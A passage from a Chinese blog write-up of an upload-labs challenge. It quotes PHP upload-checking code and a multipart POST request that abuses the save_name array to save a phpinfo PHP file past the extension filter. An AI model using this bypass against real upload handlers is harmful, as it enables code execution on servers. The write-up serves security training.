(!is_array($file)) {<span class="hljs-comment">//&#x8FD9;&#x91CC;&#x5224;&#x65AD;&#x4E86;file&#x662F;&#x5426;&#x4E3A;&#x6570;&#x7EC4;</span></span><br><span class="line">            $file = explode(<span class="hljs-string">&apos;.&apos;</span>, strtolower($file));<span class="hljs-comment">//&#x5C06;&#x6587;&#x4EF6;&#x540D;&#x6309;.&#x5206;&#x5272;&#x5F00;</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $ext = end($file);<span class="hljs-comment">//&#x53D6;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#xFF0C;&#x5373;&#x6587;&#x4EF6;&#x7684;&#x540E;&#x7F00;&#x540D;</span></span><br><span class="line">        $allow_suffix = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;jpg&apos;</span>,<span class="hljs-string">&apos;png&apos;</span>,<span class="hljs-string">&apos;gif&apos;</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> (!in_array($ext, $allow_suffix)) {</span><br><span class="line">            $msg = <span class="hljs-string">&quot;&#x7981;&#x6B62;&#x4E0A;&#x4F20;&#x8BE5;&#x540E;&#x7F00;&#x6587;&#x4EF6;!&quot;</span>;</span><br><span class="line">        }<span class="hljs-keyword">else</span>{</span><br><span class="line">            $file_name = reset($file) . <span class="hljs-string">&apos;.&apos;</span> . $file[count($file) - <span class="hljs-number">1</span>];<span class="hljs-comment">//&#x8F93;&#x51FA;&#x7B2C;&#x4E00;&#x4E2A;&#x503C;&#x52A0;&#x4E2A;&#x70B9;&#xFF0C;&#x518D;&#x8BFB;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x3002;</span></span><br><span class="line">            $temp_file = $_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="hljs-string">&apos;/&apos;</span> .$file_name;</span><br><span class="line">            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) {</span><br><span class="line">                $msg = <span class="hljs-string">&quot;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF01;&quot;</span>;</span><br><span class="line">                $is_upload = <span class="hljs-keyword">true</span>;</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                $msg = <span class="hljs-string">&quot;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&#xFF01;&quot;</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    $msg = <span class="hljs-string">&quot;&#x8BF7;&#x9009;&#x62E9;&#x8981;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#xFF01;&quot;</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x6E90;&#x7801;&#x8FDB;&#x884C;&#x4E86;&#x4EE5;&#x4E0B;&#x4E8B;&#x60C5;&#xFF1A;</p>
<ol>
<li>&#x68C0;&#x67E5;MIME</li>
<li>&#x68C0;&#x67E5;&#x540E;&#x7F00;&#x540D;(&#x8FD9;&#x91CC;&#x5168;&#x90E8;&#x5316;&#x4E3A;&#x4E86;&#x5C0F;&#x5199;)</li>
<li>&#x90FD;&#x901A;&#x8FC7;&#x4E4B;&#x540E;&#x518D;&#x4FDD;&#x5B58;&#x6587;&#x4EF6;</li>
</ol>
<p>&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;POST&#x6570;&#x636E;&#x7ED5;&#x8FC7;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 537</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------46491466030493</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------46491466030493</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">phpinfo.php/</span><br><span class="line">-----------------------------46491466030493</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br><span class="line">-----------------------------46491466030493</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">&#xE4;&#xB8;&#x8A;&#xE4;&#xBC;&#xA0;</span><br><span class="line">-----------------------------46491466030493--</span><br></pre></td></tr></table></figure>

<p>&#x5206;&#x6790;&#xFF0C;&#x7531;&#x4E8E;&#x4ED6;&#x5728;&#x524D;&#x9762;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x6570;&#x7EC4;&#x7684;if&#x8BED;&#x53E5;&#xFF0C;&#x4E8E;&#x662F;&#x53EF;&#x4EE5;&#x8D4B;&#x503C;&#x7ED9;sava_name[0]&#xFF0C;&#x548C;sava_name[2]&#x7684;&#x503C;&#x5206;&#x522B;&#x4E3A;&#xFF1A;phpinfo.php/ &#x548C; jpg&#x3002;</p>
<p>&#x6B64;&#x65F6;&#x7684;sava_name&#x7684;&#x503C;&#x4E3A;&#xFF1A;</p>
<p>&#x8FD9;&#x6837;&#x5728;&#x6700;&#x540E;&#x7684;file_name&#x8D4B;&#x503C;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4E3A;&#xFF1A;phpinfo.php/.jpg</p>
<p>&#x901A;&#x8FC7;move_uploaded_file&#xFF0C;&#x6700;&#x7EC8;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x4E3A;phpinfo.php</p>
<h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>&#x6839;&#x636E;lab&#x63D0;&#x4F9B;&#x7684;&#x56FE;&#x7247;&#x53C8;&#x603B;&#x7ED3;&#x4E86;&#x4E00;&#x4E0B;&#x3002;</p>
<p><img src="https://i.loli.net/2019/04/19/5cb9e25491567.png" alt="&#x603B;&#x7ED3;"></p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Writeup/">#Writeup</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/upload-labs/">#upload-labs</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2019/04/19/DDCTF 部分Writeup/">DDCTF 部分题目 Writeup</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2019/01/01/Head First Javascript/">Head First Javascript笔记</a>
            
        </span>
    </div>
    
</article>




    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2020 Threezh1&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    moment.locale("chinese");
</script>


    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script>
    MathJax.Hub.Config({
        "HTML-CSS": {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
</script>

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>

<script>
document.addEventListener("DOMContentLoaded", function() {
    renderMathInElement(document.body, {
        // ...options...
    });
});
</script>

    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof($.fn.justifiedGallery) === 'function') {
                $('.justified-gallery').justifiedGallery();
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    


<script src="/js/script.js"></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas...">
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Seiten',
                CATEGORIES: 'Kategorien',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/js/insight.js"></script>
    
</body>
</html>